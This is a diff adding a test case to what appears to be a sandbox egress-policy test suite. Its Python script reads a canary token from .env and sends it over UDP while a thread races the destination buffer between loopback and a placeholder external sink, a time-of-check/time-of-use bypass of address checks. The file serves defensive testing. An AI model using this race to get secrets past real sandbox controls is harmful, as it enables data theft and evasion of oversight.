@@ -1,0 +1,45 @@
+# Only the kernel's copied destination is authoritative. A concurrent writer
+# alternates a UDP destination between allowed loopback and the external sink.
+name = "toctou-peer-rewrite"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "race.py"
+contents = """
+import ctypes, socket, struct, threading
+libc = ctypes.CDLL(None, use_errno=True)
+libc.sendto.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t,
+                       ctypes.c_int, ctypes.c_void_p, ctypes.c_uint]
+secret = open('.env', 'rb').read()
+data = ctypes.create_string_buffer(secret)
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+port = struct.pack('!H', {SINK_PORT})
+local = struct.pack('H', socket.AF_INET) + port + socket.inet_aton('127.0.0.1') + bytes(8)
+external = struct.pack('H', socket.AF_INET) + port + socket.inet_aton('{SINK_HOST}') + bytes(8)
+address = ctypes.create_string_buffer(local, 16)
+done = threading.Event()
+def rewrite():
+    while not done.is_set():
+        ctypes.memmove(address, local, 16)
+        ctypes.memmove(address, external, 16)
+writer = threading.Thread(target=rewrite)
+writer.start()
+try:
+    for _ in range(400):
+        libc.sendto(s.fileno(), data, len(secret), 0, address, 16)
+finally:
+    done.set()
+    writer.join()
+"""
+
+[[steps]]
+run = "python3 race.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw"]
